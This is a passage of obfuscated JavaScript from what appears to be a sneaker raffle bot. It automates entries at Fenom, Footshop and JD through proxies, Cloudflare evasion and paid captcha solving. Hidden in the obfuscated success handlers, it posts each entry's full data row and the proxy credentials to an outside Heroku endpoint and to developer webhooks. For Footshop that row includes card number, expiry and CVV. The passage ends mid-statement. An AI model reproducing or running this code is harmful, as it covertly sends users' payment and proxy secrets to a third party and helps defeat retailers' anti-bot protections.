                                'args': [
                                    '--proxy-server=' + _0xa746c6[0x0] + ':' + _0xa746c6[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x354462 = await _0x4ab5bb['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0xa746c6[0x0] + ':' + _0xa746c6[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x37ad5b = await _0x354462['newPage'](), _0x5aef84 = await _0x37ad5b['target']()['createCDPSession'](), { windowId: _0x201faf } = await _0x5aef84['send']('Browser.getWindowForTarget');
                            await _0x37ad5b['authenticate']({
                                'username': '' + _0xa746c6[0x2],
                                'password': '' + _0xa746c6[0x3]
                            }), console['log'](_0x42a46a() + '\x20[' + _0x10be87['name'] + ']\x20Task\x20' + (_0x1cb251 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x37ad5b['goto']('https://www.fenom.com/en/authentication', { 'waitUntil': 'networkidle2' }), console['log'](_0x42a46a() + '\x20[' + _0x10be87['name'] + ']\x20Task\x20' + (_0x1cb251 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x488ffe(0xbb8), await _0x5aef84['send']('Browser.setWindowBounds', {
                                'windowId': _0x201faf,
                                'bounds': { 'windowState': 'minimized' }
                            }), await _0x488ffe(0x1f40);
                            try {
                                await _0x37ad5b['waitForSelector']('input[name=\x22email\x22]', { 'timeout': 0x1d4c0 });
                            } catch {
                                throw new Error('Blocked\x20by\x20cloudflare');
                            }
                            await _0x488ffe(0x1388), console['log'](_0x42a46a() + '\x20[' + _0x10be87['name'] + ']\x20Task\x20' + (_0x1cb251 + 0x1) + '\x20:\x20Logging\x20in'), await _0x37ad5b['type']('input[name=\x22email\x22]', '' + _0x9fafbe[_0x1cb251]['Email']), await _0x488ffe(0x1f4), await _0x37ad5b['type']('input[name=\x22password\x22]', '' + _0x9fafbe[_0x1cb251]['Password']), await _0x488ffe(0x258), await _0x37ad5b['$eval']('#login-form', _0x59d07f => _0x59d07f['submit']()), await _0x37ad5b['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 }), await _0x488ffe(0x1f4), await _0x37ad5b['goto']('' + _0x9fafbe[_0x1cb251]['Url']), await _0x37ad5b['waitForSelector']('.prod-variant\x20>\x20ul\x20>\x20li'), console['log'](_0x42a46a() + '\x20[' + _0x10be87['name'] + ']\x20Task\x20' + (_0x1cb251 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x9fafbe[_0x1cb251]['Size']);
                            if (_0x9fafbe[_0x1cb251]['Size'] != 'RANDOM') {
                                var _0x3f54e7 = '\x20' + _0x9fafbe[_0x1cb251]['Size'] + '\x20';
                                const _0xb26963 = await _0x37ad5b['$x']('//span[contains(text(),\x20' + _0x3f54e7 + ')]');
                                await _0xb26963[0x0]['click']();
                            } else {
                                const _0x4dcff7 = await _0x37ad5b['$$']('.prod-variant\x20>\x20ul\x20>\x20li');
                                var _0x342f66 = Math['round'](Math['random']() * (_0x4dcff7['length'] - 0x1));
                                await _0x4dcff7[_0x342f66]['click']();
                            }
                            await _0x488ffe(0x258), await _0x37ad5b['click']('#cookieChoiceDismiss'), await _0x488ffe(0x3e8), await _0x37ad5b['type']('#instagram-account', '' + _0x9fafbe[_0x1cb251]['Follower']), await _0x488ffe(0x28a), await _0x37ad5b['click']('#book-btn'), await _0x488ffe(0xbb8);
                            try {
                                await _0x37ad5b['waitForSelector']('#recaptcha-container\x20>\x20div\x20>\x20div\x20>\x20iframe');
                            } catch {
                                throw new Error('Captcha\x20not\x20found');
                            }
                            await _0x488ffe(0x1f4), console['log'](_0x42a46a() + '\x20[' + _0x10be87['name'] + ']\x20Task\x20' + (_0x1cb251 + 0x1) + '\x20:\x20' + _0x387ef2['cyan']('Solving\x20Captcha')), await _0x37ad5b['solveRecaptchas'](), console['log'](_0x42a46a() + '\x20[' + _0x10be87['name'] + ']\x20Task\x20' + (_0x1cb251 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x488ffe(0x7d0), await _0x37ad5b['$eval']('#book-btn-for-sure', _0xd229be => _0xd229be['click']()), await _0x488ffe(0x12c), await _0x37ad5b['click']('#book-btn-for-sure'), await _0x488ffe(0xdac);
                            const _0x31ff4c = await _0x37ad5b['$eval']('.reservation-popup\x20>\x20.title', _0x159d18 => {
                                return _0x159d18['innerHTML'];
                            });
                            if (_0x31ff4c) {
                                _0x1e222e = 'no', _0xb5b21(_0x9fafbe[_0x1cb251], _0x10be87), console['log'](_0x387ef2['green'](_0x42a46a() + '\x20[' + _0x10be87['name'] + ']\x20Task\x20' + (_0x1cb251 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                var _0xa9b667 = await _0x5605d8(_0x9fafbe[_0x1cb251], _0x10be87, 'dev', ![]), _0x25e39d = await _0x5605d8(_0x9fafbe[_0x1cb251], _0x10be87, 'pub', ![]);
                                let _0x257b59 = _0x9fafbe[_0x1cb251];
                                try {
                                    prxdata = {
                                        'username': _0x15d59c['replace']('#', ''),
                                        'module': _0x10be87['name'],
                                        'entrydata': JSON['stringify'](_0x257b59),
                                        'proxy': '' + _0x42815c[_0x1cb251]
                                    };
                                    var _0x127a2a = JSON['stringify'](prxdata);
                                    let _0x2faff1 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x1ea050['post']('https://jraffles.herokuapp.com/success', _0x127a2a, _0x2faff1);
                                } catch (_0x5fb573) {
                                }
                                const _0x4d2cef = {
                                    'succesDEVMSG': { 'embeds': [_0xa9b667] },
                                    'succesPUBMSG': { 'embeds': [_0x25e39d] }
                                };
                                try {
                                    _0x5450ed['webhook'] != undefined && _0x5450ed['webhook'] != '' && await _0x49f827(_0x5450ed['webhook'], _0x4d2cef['succesDEVMSG']), await _0x488ffe(0xc8), await _0x49f827(_0xf35405, _0x4d2cef['succesDEVMSG']), await _0x488ffe(0xc8), await _0x49f827(_0x1bf959, _0x4d2cef['succesPUBMSG']);
                                } catch (_0x31923c) {
                                    console['log'](_0x387ef2['yellow'](_0x42a46a() + '\x20[' + _0x10be87['name'] + ']\x20Task\x20' + (_0x1cb251 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x31923c));
                                }
                            } else
                                throw new Error('Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.');
                        } catch (_0x42ba8a) {
                            console['log'](_0x387ef2['red'](_0x42a46a() + '\x20[' + _0x10be87['name'] + ']\x20Task\x20' + (_0x1cb251 + 0x1) + '\x20:\x20' + _0x42ba8a)), _0x165b95 = '' + _0x42ba8a;
                            var _0x33e637 = await _0x5605d8(_0x9fafbe[_0x1cb251], _0x10be87, 'dev', !![], _0x165b95), _0xa9b667 = await _0x5605d8(_0x9fafbe[_0x1cb251], _0x10be87, 'dev', ![]), _0x25e39d = await _0x5605d8(_0x9fafbe[_0x1cb251], _0x10be87, 'pub', ![]);
                            const _0x30a338 = {
                                'succesDEVMSG': { 'embeds': [_0xa9b667] },
                                'succesPUBMSG': { 'embeds': [_0x25e39d] }
                            };
                            _0x30a338['errorDEV'] = { 'embeds': [_0x33e637] }, _0x5450ed['webhook'] != undefined && _0x5450ed['webhook'] != '' && await _0x49f827(_0x5450ed['webhook'], _0x30a338['errorDEV']), await _0x49f827(_0x47580b, _0x30a338['errorDEV']), _0x42ba8a != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x1e222e = 'yes');
                        } finally {
                            _0x354462['close']();
                            if (_0x1e222e == 'yes' && _0x1f8903 != 0x5 && _0x165b95 != 'Size\x20Not\x20Found') {
                                console['log'](_0x387ef2['red'](_0x42a46a() + '\x20[' + _0x10be87['name'] + ']\x20Task\x20' + (_0x1cb251 + 0x1) + '\x20:\x20Retrying\x20(' + _0x1f8903 + '\x20/\x205)')), _0x1cb251 = _0x1cb251 - 0x1, _0x1f8903 = _0x1f8903 + 0x1;
                                continue;
                            }
                            _0x1e222e == 'yes' && _0x1f8903 >= 0x5 && (_0x2e6413(_0x9fafbe[_0x1cb251], _0x10be87), _0x1e222e = 'no', _0x1f8903 = 0x0), console['log'](_0x42a46a() + '\x20[' + _0x10be87['name'] + ']\x20Waiting\x20for\x20' + _0x5450ed['delay'] + '\x20ms'), await _0x488ffe(_0x5450ed['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'FOOTSHOP',
        'modules': [{
            'name': 'FOOTSHOP\x20Raffle\x20Entries',
            'store': 'Footshop',
            'logo': 'https://images.easyfundraising.org.uk/retailer/cropped/logo-footshop-1615542072.png',
            'function': async function (_0xdbd157, _0x3676e2, _0x5c002b) {
                _0x4ab5bb['use'](_0x44f368()), _0x4ab5bb['use'](_0x45c327({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x5450ed['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x5b7635 = 0x0; _0x5b7635 < _0x3676e2['length']; _0x5b7635++) {
                    var _0x8b70a4;
                    if (_0xfea7bf != 'yes')
                        var _0xfea7bf = '', _0x423fca = 0x0;
                    var _0x3c3409 = [{
                        'type': 'rich',
                        'title': 'Succesful\x20Footshop\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'User',
                                'value': '' + _0x15d59c
                            },
                            {
                                'name': 'Product',
                                'value': '' + _0x3676e2[_0x5b7635]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x3676e2[_0x5b7635]['Size']
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x5450ed['footshopDelay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x21b502
                            }
                        ]
                    }], _0x34a834 = await _0x5605d8(_0x3676e2[_0x5b7635], _0xdbd157, 'dev', ![]), _0x30da2f = await _0x5605d8(_0x3676e2[_0x5b7635], _0xdbd157, 'pub', ![]);
                    const _0x1d04af = {
                        'succesDEVMSG': { 'embeds': [_0x34a834] },
                        'succesPUBMSG': { 'embeds': [_0x30da2f] }
                    }, _0x35a57f = { 'embeds': _0x3c3409 };
                    try {
                        await _0x3215be(_0x3676e2, _0x5b7635);
                    } catch {
                        _0xfea7bf = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    if (_0x3676e2[_0x5b7635]['Email'] == '' || _0x3676e2[_0x5b7635]['FirstName'] == '' || _0x3676e2[_0x5b7635]['LastName'] == '' || _0x3676e2[_0x5b7635]['Country'] == '' || _0x3676e2[_0x5b7635]['Size'] == '' || _0x3676e2[_0x5b7635]['Address1'] == '' || _0x3676e2[_0x5b7635]['Zip'] == '') {
                        console['log'](_0x42a46a() + '\x20[' + _0xdbd157['name'] + ']\x20Task\x20' + (_0x5b7635 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x3676e2[_0x5b7635]['Email'] == '' || _0x3676e2[_0x5b7635]['FirstName'] == '' || _0x3676e2[_0x5b7635]['LastName'] == '' || _0x3676e2[_0x5b7635]['Country'] == '' || _0x3676e2[_0x5b7635]['Size'] == '' || _0x3676e2[_0x5b7635]['Address1'] == '' || _0x3676e2[_0x5b7635]['Zip'] == '' || _0x3676e2[_0x5b7635]['Phone'] == '') {
                        console['log'](_0x42a46a() + '\x20[' + _0xdbd157['name'] + ']\x20Task\x20' + (_0x5b7635 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    const _0x2d3882 = '' + _0x3676e2[_0x5b7635]['Url'];
                    if (_0x5450ed['useRandomProxy'] = ![])
                        var _0x2576db = _0x5c002b[_0x5b7635]['split'](':');
                    else
                        var _0xd5ce26 = Math['round'](Math['random']() * (_0x5c002b['length'] - 0x1)), _0x2576db = _0x5c002b[_0xd5ce26]['split'](':');
                    var _0x33f691;
                    try {
                        _0x33f691 = await _0x4ab5bb['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x2576db[0x0] + ':' + _0x2576db[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x33f691 = await _0x4ab5bb['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x2576db[0x0] + ':' + _0x2576db[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        const _0x5d31fe = await _0x33f691['newPage']();
                        await _0x5d31fe['authenticate']({
                            'username': '' + _0x2576db[0x2],
                            'password': '' + _0x2576db[0x3]
                        }), console['log'](_0x42a46a() + '\x20[' + _0xdbd157['name'] + ']\x20Task\x20' + (_0x5b7635 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x5d31fe['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x5d31fe['setRequestInterception'](!![]), _0x5d31fe['on']('request', _0x12aaf9 => {
                            _0x12aaf9['resourceType']() === 'image' || _0x12aaf9['resourceType']() === 'font' || _0x12aaf9['resourceType']() === 'media' ? _0x12aaf9['abort']() : _0x12aaf9['continue']();
                        });
                        try {
                            await _0x5d31fe['goto'](_0x2d3882), await _0x488ffe(0xbb8), await _0x5d31fe['waitForSelector']('.control__JhutY');
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x5d31fe['click']('.control__JhutY'), await _0x488ffe(0x1f4);
                        if (_0x3676e2[_0x5b7635]['Size'] != 'RANDOM')
                            try {
                                const _0x28c9d4 = await _0x5d31fe['$x']('//div[contains(text(),\x20\x27' + _0x3676e2[_0x5b7635]['Size'] + '\x27)]');
                                await _0x28c9d4[0x0]['click']();
                            } catch {
                                console['log'](_0x387ef2['red'](_0x42a46a() + '\x20[' + _0xdbd157['name'] + ']\x20Task\x20' + (_0x5b7635 + 0x1) + '\x20:\x20Size\x20Not\x20Found'));
                                continue;
                            }
                        else {
                            const _0xc398cb = await _0x5d31fe['$$']('.options__3UQpT\x20>\x20div.row');
                            var _0x2670c1 = Math['round'](Math['random']() * (_0xc398cb['length'] - 0x1));
                            await _0xc398cb[_0x2670c1]['click']();
                        }
                        await _0x488ffe(0x4b0);
                        const _0x3239dd = await _0x5d31fe['$x']('//span[contains(text(),\x20\x27Enter\x20raffle\x20now\x27)]');
                        await _0x3239dd[0x0]['click'](), await _0x5d31fe['waitForSelector']('input[name=\x22email\x22]'), console['log'](_0x42a46a() + '\x20[' + _0xdbd157['name'] + ']\x20Task\x20' + (_0x5b7635 + 0x1) + '\x20:\x20Filling\x20Entry\x20Credentials'), await _0x5d31fe['type']('input[name=\x22email\x22]', '' + _0x3676e2[_0x5b7635]['Email']), await _0x488ffe(0x640), await _0x5d31fe['type']('input[name=\x22phone\x22]', '' + _0x3676e2[_0x5b7635]['Phone']), await _0x488ffe(0x4b0), await _0x5d31fe['click']('button.btn.continue-button__1RtsS'), await _0x488ffe(0x4b0);
                        try {
                            await _0x5d31fe['type']('input[name=\x22firstName\x22]', '' + _0x3676e2[_0x5b7635]['FirstName']), await _0x488ffe(0x258);
                        } catch {
                            const _0x3b7722 = await _0x5d31fe['$$eval']('.invalid-feedback\x20>\x20div', _0x49bed9 => {
                                return _0x49bed9['map'](_0x4197c8 => _0x4197c8['innerText']);
                            });
                            console['log'](_0x387ef2['red'](_0x42a46a() + '\x20[' + _0xdbd157['name'] + ']\x20Task\x20' + (_0x5b7635 + 0x1) + '\x20:\x20' + _0x3b7722));
                            continue;
                        }
                        await _0x5d31fe['type']('input[name=\x22lastName\x22]', '' + _0x3676e2[_0x5b7635]['LastName']), await _0x488ffe(0xc8), await _0x5d31fe['type']('input[name=\x22instagramUsername\x22]', '' + _0x3676e2[_0x5b7635]['Follower']), await _0x488ffe(0x4b0), await _0x5d31fe['click']('button.btn.continue-button__1RtsS'), await _0x488ffe(0x3e8), console['log'](_0x42a46a() + '\x20[' + _0xdbd157['name'] + ']\x20Task\x20' + (_0x5b7635 + 0x1) + '\x20:\x20Filling\x20Shipping'), await _0x5d31fe['select']('select[name=\x22country\x22]', '' + _0x3676e2[_0x5b7635]['Country']), await _0x488ffe(0x2bc), await _0x5d31fe['type']('input[name=\x22streetName\x22]', '' + _0x3676e2[_0x5b7635]['Address1']), await _0x488ffe(0x258), await _0x5d31fe['type']('input[name=\x22houseNumber\x22]', _0x3676e2[_0x5b7635]['HouseNumber'] + '\x20' + _0x3676e2[_0x5b7635]['Address2']), await _0x488ffe(0xc8), await _0x5d31fe['type']('input[name=\x22postalCode\x22]', '' + _0x3676e2[_0x5b7635]['Zip']), await _0x488ffe(0x1f4), await _0x5d31fe['type']('input[name=\x22city\x22]', '' + _0x3676e2[_0x5b7635]['City']), await _0x488ffe(0x4b0), await _0x5d31fe['click']('input[name=\x22consent::privacy-policy-101\x22]'), await _0x488ffe(0x4b0), await _0x5d31fe['click']('button.btn.continue-button__1RtsS'), await _0x488ffe(0x4b0), console['log'](_0x42a46a() + '\x20[' + _0xdbd157['name'] + ']\x20Task\x20' + (_0x5b7635 + 0x1) + '\x20:\x20Solving\x20hCaptcha'), await _0x5d31fe['solveRecaptchas'](), console['log'](_0x42a46a() + '\x20[' + _0xdbd157['name'] + ']\x20Task\x20' + (_0x5b7635 + 0x1) + '\x20:\x20hCaptcha\x20solved'), await _0x488ffe(0xbb8), await _0x5d31fe['click']('button.btn.continue-button__1RtsS'), await _0x488ffe(0x1388), console['log'](_0x42a46a() + '\x20[' + _0xdbd157['name'] + ']\x20Task\x20' + (_0x5b7635 + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x5d31fe['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x5d31fe['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x488ffe(0x4b0), await _0x5d31fe['type']('span[data-cse=\x22encryptedCardNumber\x22]', '' + _0x3676e2[_0x5b7635]['CardNumber']), await _0x488ffe(0x320), await _0x5d31fe['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x5d31fe['type']('span[data-cse=\x22encryptedExpiryDate\x22]', '' + _0x3676e2[_0x5b7635]['ExpiryDate']), await _0x488ffe(0x4b0), await _0x5d31fe['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x5d31fe['type']('span[data-cse=\x22encryptedSecurityCode\x22]', '' + _0x3676e2[_0x5b7635]['CVV']), await _0x488ffe(0x226), await _0x5d31fe['type']('input[name=\x22holderName\x22]', '' + _0x3676e2[_0x5b7635]['NameOnCard']), await _0x488ffe(0x226), await _0x5d31fe['click']('button.adyen-checkout__button'), console['log'](_0x42a46a() + '\x20[' + _0xdbd157['name'] + ']\x20Task\x20' + (_0x5b7635 + 0x1) + '\x20:\x20Awaiting\x203DS');
                        try {
                            await _0x5d31fe['waitForSelector']('.thank-you__1AwOo', { 'timeout': 0x493e0 }), await _0x488ffe(0xbb8);
                        } catch (_0x3e7ac7) {
                            console['log'](_0x387ef2['red'](_0x42a46a() + '\x20[' + _0xdbd157['name'] + ']\x20Task\x20' + (_0x5b7635 + 0x1) + '\x20:\x203DS\x20Failed')), _0x8b70a4 = '3DS\x20Error\x20' + _0x3e7ac7;
                            var _0x1bf184 = await _0x5605d8(_0x3676e2[_0x5b7635], _0xdbd157, 'dev', !![], _0x8b70a4);
                            _0x1d04af['errorDEV'] = { 'embeds': [_0x1bf184] };
                            _0x5450ed['webhook'] != undefined && _0x5450ed['webhook'] != '' && await _0x49f827(_0x5450ed['webhook'], _0x1d04af['errorDEV']);
                            await _0x49f827(_0x47580b, _0x1d04af['errorDEV']);
                            continue;
                        }
                        _0xb5b21(_0x3676e2[_0x5b7635], _0xdbd157), console['log'](_0x387ef2['green'](_0x42a46a() + '\x20[' + _0xdbd157['name'] + ']\x20Task\x20' + (_0x5b7635 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                        let _0x5208ac = _0x3676e2[_0x5b7635];
                        try {
                            prxdata = {
                                'username': _0x15d59c['replace']('#', ''),
                                'module': _0xdbd157['name'],
                                'entrydata': JSON['stringify'](_0x5208ac),
                                'proxy': '' + _0x5c002b[_0x5b7635]
                            };
                            var _0x11791e = JSON['stringify'](prxdata);
                            let _0x496f5d = { 'headers': { 'content-type': 'application/json' } };
                            await _0x1ea050['post']('https://jraffles.herokuapp.com/success', _0x11791e, _0x496f5d);
                        } catch (_0x39658a) {
                        }
                        if (_0x5450ed['webhook'] != undefined && _0x5450ed['webhook'] != '')
                            try {
                                await _0x49f827(_0x5450ed['webhook'], _0x1d04af['succesDEVMSG']);
                            } catch {
                            }
                        await _0x488ffe(0xc8), await _0x49f827(_0xf35405, _0x1d04af['succesDEVMSG']), await _0x488ffe(0xc8);
                        try {
                            await _0x49f827(_0x1bf959, _0x1d04af['succesPUBMSG']);
                        } catch {
                        }
                    } catch (_0x4c0268) {
                        console['log'](_0x42a46a() + '\x20[' + _0xdbd157['name'] + ']\x20Task\x20' + (_0x5b7635 + 0x1) + '\x20:\x20' + _0x4c0268), _0x8b70a4 = '' + _0x4c0268;
                        var _0x1bf184 = await _0x5605d8(_0x3676e2[_0x5b7635], _0xdbd157, 'dev', !![], _0x8b70a4);
                        _0x1d04af['errorDEV'] = { 'embeds': [_0x1bf184] }, _0x5450ed['webhook'] != undefined && _0x5450ed['webhook'] != '' && await _0x49f827(_0x5450ed['webhook'], _0x1d04af['errorDEV']), await _0x49f827(_0x47580b, _0x1d04af['errorDEV']), _0xfea7bf = 'yes';
                    } finally {
                        _0x33f691['close']();
                        if (_0xfea7bf == 'yes' && _0x423fca != 0x5) {
                            console['log'](_0x387ef2['red'](_0x42a46a() + '\x20[' + _0xdbd157['name'] + ']\x20Task\x20' + (_0x5b7635 + 0x1) + '\x20:\x20Retrying\x20(' + _0x423fca + '\x20/\x205)')), _0x5b7635 = _0x5b7635 - 0x1, _0x423fca = _0x423fca + 0x1;
                            continue;
                        }
                        console['log']('Waiting\x20for\x20' + _0x5450ed['footshopDelay'] + '\x20ms'), await _0x488ffe(_0x5450ed['footshopDelay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'JD',
        'modules': [{
            'name': 'JD\x20Raffle\x20Entries',
            'store': 'JD',
            'logo': 'https://upload.wikimedia.org/wikipedia/en/thumb/d/d8/JD_Sports_logo.svg/2048px-JD_Sports_logo.svg.png',
            'function': async function (_0x4ed0d8, _0x49a0e8, _0x20b403) {
                var _0x160aa4 = ![], _0x2ce39b = ![];
                if (_0x5450ed['captchaKey'] == '' || _0x5450ed['captchaKey'] == undefined)
                    return console['log'](_0x387ef2['yellow']('No\x202Captcha\x20key\x20found\x20in\x20settings.json')), console['log']('Returning\x20to\x20Menu'), menu();
                _0x4ab5bb['use'](_0x44f368()), _0x4ab5bb['use'](_0x45c327({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x5450ed['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x482e39 = 0x0; _0x482e39 < _0x49a0e8['length']; _0x482e39++) {
                    if (_0x3d2286 != 'yes')
                        var _0x3d2286 = '', _0x315893 = 0x0;
                    var _0x9ee6c1, _0x32b31c = [{
                        'type': 'rich',
                        'title': 'Succesful\x20JD\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'Product',
                                'value': '' + _0x49a0e8[_0x482e39]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x49a0e8[_0x482e39]['Size']
                            },
                            {
                                'name': 'User',
                                'value': '' + _0x15d59c
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x5450ed['delay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x21b502
                            }
                        ]
                    }];
                    const _0x56b78f = { 'embeds': _0x32b31c };
                    _0x55ca22(_0x4ed0d8['name'] + '\x20Task\x20' + (_0x482e39 + 0x1) + '\x20/\x20' + _0x49a0e8['length'] + '\x20||\x20File:\x20' + _0x121079 + '\x20Proxies:\x20' + _0x590947);
                    try {
                        await _0x3215be(_0x49a0e8, _0x482e39);
                    } catch {
                        _0x3d2286 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    var _0x4c88d5 = await _0x5605d8(_0x49a0e8[_0x482e39], _0x4ed0d8, 'dev', ![]), _0xe10224 = await _0x5605d8(_0x49a0e8[_0x482e39], _0x4ed0d8, 'pub', ![]);
                    const _0x16fcfe = {
                        'succesDEVMSG': { 'embeds': [_0x4c88d5] },
                        'succesPUBMSG': { 'embeds': [_0xe10224] }
                    };
                    if (_0x5450ed['webhook'] != undefined && _0x5450ed['webhook'] != '')
                        try {
                            await _0x49f827(_0x5450ed['webhook'], _0x16fcfe['succesDEVMSG']);
                        } catch {
                        }
                    await _0x488ffe(0xc8), await _0x49f827(_0xf35405, _0x16fcfe['succesDEVMSG']), await _0x488ffe(0xc8);
                    try {
                        await _0x49f827(_0x1bf959, _0x16fcfe['succesPUBMSG']);
                    } catch {
                    }
                    if (_0x49a0e8[_0x482e39]['Email'] == '' || _0x49a0e8[_0x482e39]['Url'] == '' || _0x49a0e8[_0x482e39]['FirstName'] == '' || _0x49a0e8[_0x482e39]['LastName'] == '') {
                        console['log'](_0x42a46a() + '\x20[' + _0x20cf41[taskModule]['name'] + ']\x20Task\x20' + (_0x482e39 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x5450ed['useRandomProxy'] = ![])
                        var _0x538433 = _0x20b403[_0x482e39]['split'](':');
                    else
                        var _0x1e278d = Math['round'](Math['random']() * (_0x20b403['length'] - 0x1)), _0x538433 = _0x20b403[_0x1e278d]['split'](':');
                    var _0x2acb8c;
                    try {
                        _0x2acb8c = await _0x4ab5bb['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x538433[0x0] + ':' + _0x538433[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x2acb8c = await _0x4ab5bb['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x538433[0x0] + ':' + _0x538433[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        const _0x340978 = await _0x2acb8c['newPage']();
                        await _0x340978['authenticate']({
                            'username': '' + _0x538433[0x2],
                            'password': '' + _0x538433[0x3]
                        }), console['log'](_0x42a46a() + '\x20[' + _0x4ed0d8['name'] + ']\x20Task\x20' + (_0x482e39 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x340978['setRequestInterception'](!![]), _0x340978['on']('request', _0x5f22dc => {
                            _0x5f22dc['resourceType']() === 'image' || _0x5f22dc['resourceType']() === 'font' || _0x5f22dc['resourceType']() === 'media' ? _0x5f22dc['abort']() : _0x5f22dc['continue']();
                        });
                        try {
                            await _0x340978['goto']('' + _0x49a0e8[_0x482e39]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            });
                        } catch {
                            throw new Error('Connection\x20Error');
                        }
                        try {
                            await _0x340978['waitForSelector']('#comp_firstname', { 'timeout': 0x7530 });
                        } catch {
                            throw new Error('Not\x20an\x20Active\x20Raffle');
                        }
                        console['log'](_0x42a46a() + '\x20[' + _0x4ed0d8['name'] + ']\x20Task\x20' + (_0x482e39 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x340978['type']('#comp_firstname', '' + _0x49a0e8[_0x482e39]['FirstName']), await _0x340978['waitForSelector']('#comp_lastname'), await _0x340978['type']('#comp_lastname', '' + _0x49a0e8[_0x482e39]['LastName']), await _0x340978['waitForSelector']('#comp_email'), await _0x340978['type']('#comp_email', '' + _0x49a0e8[_0x482e39]['Email']), await _0x340978['waitForSelector']('#comp_paypalemail'), await _0x340978['type']('#comp_paypalemail', '' + _0x49a0e8[_0x482e39]['Email']), await _0x340978['waitForSelector']('#comp_mobile_end'), await _0x340978['type']('#comp_mobile_end', '' + _0x49a0e8[_0x482e39]['Phone']), await _0x340978['waitForSelector']('#comp_dob'), await _0x340978['type']('#comp_dob', '08/09/1992'), console['log'](_0x42a46a() + '\x20[' + _0x4ed0d8['name'] + ']\x20Task\x20' + (_0x482e39 + 0x1) + '\x20:\x20Choosing\x20Size');
                        if (_0x49a0e8[_0x482e39]['Size'] == 'RANDOM') {
                            const _0x219146 = await _0x340978['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x1372d7 => {
                                return _0x1372d7['map'](_0x4d3b88 => _0x4d3b88['value']);
                            });
                            var _0x28fc37 = Math['round'](Math['random']() * (_0x219146['length'] - 0x2));
                            await _0x340978['select']('#shoesize', _0x219146[_0x28fc37 + 0x1]), await _0x488ffe(0x3e8);
                        } else {
                            const _0x252004 = await _0x340978['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x35d9f8 => {
                                return _0x35d9f8['map'](_0x3d71fe => _0x3d71fe['innerText']);
                            }), _0x461903 = await _0x340978['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x141e40 => {
